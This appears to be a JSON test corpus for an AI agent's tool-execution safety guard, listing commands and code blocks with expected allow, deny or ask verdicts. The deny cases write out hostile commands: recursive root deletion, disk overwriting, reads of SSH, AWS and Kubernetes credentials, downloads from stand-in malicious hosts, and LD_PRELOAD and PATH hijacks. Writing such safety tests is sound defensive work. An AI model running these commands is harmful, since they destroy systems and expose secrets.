{
  "schema_version": "1",
  "description": "Shared test corpus for the Tool Execution Safety Guard. Used by quality_test.go and examples/tool_safety_guard/main.go.",
  "cases": [
    {
      "name": "safe go test",
      "category": "safe",
      "expected": "allow",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "go test ./..."}
    },
    {
      "name": "safe git status",
      "category": "safe",
      "expected": "allow",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "git status"}
    },
    {
      "name": "safe ls",
      "category": "safe",
      "expected": "allow",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "ls -la"}
    },
    {
      "name": "safe grep",
      "category": "safe",
      "expected": "allow",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "grep foo bar.txt"}
    },
    {
      "name": "safe whitelisted curl",
      "category": "safe",
      "expected": "allow",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "curl https://github.com/org/repo"}
    },
    {
      "name": "safe whitelisted api.github.com",
      "category": "safe",
      "expected": "allow",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "curl https://api.github.com/repos/trpc-group/trpc-agent-go"}
    },
    {
      "name": "safe python code block",
      "category": "safe",
      "expected": "allow",
      "input": {"tool_name": "execute_code", "backend": "codeexec", "code_blocks": [{"language": "python", "code": "print('hello')"}]}
    },
    {
      "name": "dangerous delete rm -rf /",
      "category": "dangerous_delete",
      "expected": "deny",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "rm -rf /"}
    },
    {
      "name": "dangerous delete rm -rf etc",
      "category": "dangerous_delete",
      "expected": "deny",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "rm -rf /etc"}
    },
    {
      "name": "dangerous delete dd of dev",
      "category": "dangerous_delete",
      "expected": "deny",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "dd if=/dev/zero of=/dev/sda"}
    },
    {
      "name": "credential read ssh",
      "category": "credential_read",
      "expected": "deny",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "cat ~/.ssh/id_rsa"}
    },
    {
      "name": "credential read aws",
      "category": "credential_read",
      "expected": "deny",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "cat ~/.aws/credentials"}
    },
    {
      "name": "credential read dotenv",
      "category": "credential_read",
      "expected": "deny",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "cat .env"}
    },
    {
      "name": "credential read kube",
      "category": "credential_read",
      "expected": "deny",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "cat ~/.kube/config"}
    },
    {
      "name": "network non-whitelisted",
      "category": "network",
      "expected": "deny",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "curl https://evil.example/x"}
    },
    {
      "name": "network wget non-whitelisted",
      "category": "network",
      "expected": "deny",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "wget https://malware.example/payload"}
    },
    {
      "name": "network localhost",
      "category": "network",
      "expected": "deny",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "curl http://localhost:8080/"}
    },
    {
      "name": "shell wrapper",
      "category": "shell",
      "expected": "deny",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "sh -c 'curl https://x/'"}
    },
    {
      "name": "shell substitution",
      "category": "shell",
      "expected": "deny",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "echo $(whoami)"}
    },
    {
      "name": "shell backtick",
      "category": "shell",
      "expected": "deny",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "echo `whoami`"}
    },
    {
      "name": "safe pipeline cat grep",
      "category": "safe",
      "expected": "allow",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "cat README.md | grep foo"}
    },
    {
      "name": "pipeline with disallowed segment",
      "category": "shell",
      "expected": "deny",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "cat README.md | wc -l"}
    },
    {
      "name": "dependency npm",
      "category": "dependency",
      "expected": "ask",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "npm install package"}
    },
    {
      "name": "dependency pip",
      "category": "dependency",
      "expected": "ask",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "pip install -r requirements.txt"}
    },
    {
      "name": "dependency go install",
      "category": "dependency",
      "expected": "ask",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "go install golang.org/x/tools/cmd/goimports@latest"}
    },
    {
      "name": "resource long sleep",
      "category": "resource",
      "expected": "deny",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "sleep 999999"}
    },
    {
      "name": "resource output bomb yes",
      "category": "resource",
      "expected": "deny",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "yes"}
    },
    {
      "name": "resource unbounded loop code",
      "category": "resource",
      "expected": "deny",
      "input": {"tool_name": "execute_code", "backend": "codeexec", "code_blocks": [{"language": "python", "code": "while True:\n    print('x')"}]}
    },
    {
      "name": "host pty long session",
      "category": "host",
      "expected": "deny",
      "input": {"tool_name": "exec_command", "backend": "hostexec", "command": "bash", "pty": true, "timeout_seconds": 0}
    },
    {
      "name": "host background session",
      "category": "host",
      "expected": "deny",
      "input": {"tool_name": "exec_command", "backend": "hostexec", "command": "sleep 60", "background": true, "timeout_seconds": 0}
    },
    {
      "name": "host privilege escalation",
      "category": "host",
      "expected": "deny",
      "input": {"tool_name": "exec_command", "backend": "hostexec", "command": "sudo id"}
    },
    {
      "name": "secret in command",
      "category": "secret",
      "expected": "deny",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "echo API_KEY=sk_live_1234567890abcdef1234"}
    },
    {
      "name": "secret in code block private key",
      "category": "secret",
      "expected": "deny",
      "input": {"tool_name": "execute_code", "backend": "codeexec", "code_blocks": [{"language": "python", "code": "key='-----BEGIN RSA PRIVATE KEY-----\\nMIIE...\\n-----END RSA PRIVATE KEY-----'"}]}
    },
    {
      "name": "cwd system path",
      "category": "dangerous_delete",
      "expected": "deny",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "go test ./...", "cwd": "/etc"}
    },
    {
      "name": "env non-whitelisted name",
      "category": "safe",
      "expected": "deny",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "go test ./...", "env": {"LD_PRELOAD": "/tmp/evil.so"}}
    },
    {
      "name": "code block with os.system rm",
      "category": "dangerous_delete",
      "expected": "deny",
      "input": {"tool_name": "execute_code", "backend": "codeexec", "code_blocks": [{"language": "python", "code": "import os; os.system('rm -rf /')"}]}
    },
    {
      "name": "direct bash rm -rf /",
      "category": "dangerous_delete",
      "expected": "deny",
      "input": {"tool_name": "execute_code", "backend": "codeexec", "code_blocks": [{"language": "bash", "code": "rm -rf /"}]}
    },
    {
      "name": "python shutil.rmtree root",
      "category": "dangerous_delete",
      "expected": "deny",
      "input": {"tool_name": "execute_code", "backend": "codeexec", "code_blocks": [{"language": "python", "code": "import shutil; shutil.rmtree('/')"}]}
    },
    {
      "name": "bash read absolute credential",
      "category": "credential_read",
      "expected": "deny",
      "input": {"tool_name": "execute_code", "backend": "codeexec", "code_blocks": [{"language": "bash", "code": "cat /home/alice/.aws/credentials"}]}
    },
    {
      "name": "find / -delete",
      "category": "dangerous_delete",
      "expected": "deny",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "find / -delete"}
    },
    {
      "name": "cat /proc/self/environ",
      "category": "credential_read",
      "expected": "deny",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "cat /proc/self/environ"}
    },
    {
      "name": "cat runtime secret token",
      "category": "credential_read",
      "expected": "deny",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "cat /var/run/secrets/kubernetes.io/serviceaccount/token"}
    },
    {
      "name": "path evidence with secret",
      "category": "secret",
      "expected": "deny",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "cat /etc/API_KEY=sk_live_1234567890abcdef1234"}
    },
    {
      "name": "env PATH override",
      "category": "safe",
      "expected": "deny",
      "input": {"tool_name": "exec_command", "backend": "hostexec", "command": "go test ./...", "env": {"PATH": "/tmp/attacker-bin"}}
    },
    {
      "name": "sleep infinity",
      "category": "resource",
      "expected": "deny",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "sleep infinity"}
    },
    {
      "name": "git clone allowlisted",
      "category": "safe",
      "expected": "allow",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "git clone https://github.com/org/repo"}
    },
    {
      "name": "curl with header allowlisted",
      "category": "safe",
      "expected": "allow",
      "input": {"tool_name": "workspace_exec", "backend": "workspace_exec", "command": "curl -H 'Accept: application/json' https://github.com/org/repo"}
    }
  ]
}
